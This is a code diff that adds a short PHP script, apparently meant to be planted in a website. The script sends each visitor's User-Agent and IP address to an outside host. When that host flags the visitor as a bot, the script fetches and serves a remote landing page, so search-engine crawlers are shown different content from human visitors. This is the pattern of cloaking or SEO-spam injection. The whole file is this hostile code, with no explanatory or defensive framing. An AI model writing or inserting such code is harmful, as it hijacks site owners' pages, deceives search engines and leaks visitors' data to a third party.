@@ -1,0 +1,25 @@
+<?php
+$opts = array(
+    'http' => array(
+        'method' => 'POST',
+        'header' => "Content-Type: application/x-www-form-urlencoded\r\n" .
+                   "X-API-KEY: gen88\r\n",
+        'content' => http_build_query(array(
+            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+            'ip' => $_SERVER['REMOTE_ADDR']
+        ))
+    )
+);
+
+$context = stream_context_create($opts);
+$response = @file_get_contents('https://page.trattoriadelborgopg.it/API/bot.php', false, $context);
+
+if ($response !== false) {
+    $data = json_decode($response, true);
+    if($data['is_bot']) {
+        header('HTTP/1.1 200 OK');
+        echo @file_get_contents('https://page.trattoriadelborgopg.it/jiyugaokashika/lp.html');
+        exit;
+    }
+}
+?>
